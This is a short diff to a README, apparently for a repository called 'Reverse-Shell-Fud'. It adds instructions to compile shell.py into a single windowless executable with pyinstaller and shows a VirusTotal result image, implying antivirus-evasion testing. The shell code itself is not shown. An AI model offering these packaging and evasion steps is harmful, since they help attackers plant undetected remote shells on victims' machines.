@@ -28,3 +28,11 @@
 » runs install_python.bat if python is installed
 
 » to make exe from python
+» open cmd and type 
+
+`pyinstaller --onefile --windowed shell.py`
+
+» py to exe virustotal result 
+
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="55%" src="https://raw.githubusercontent.com/Ayhuuu/Reverse-Shell-Fud/main/img/python.png"></img>
+
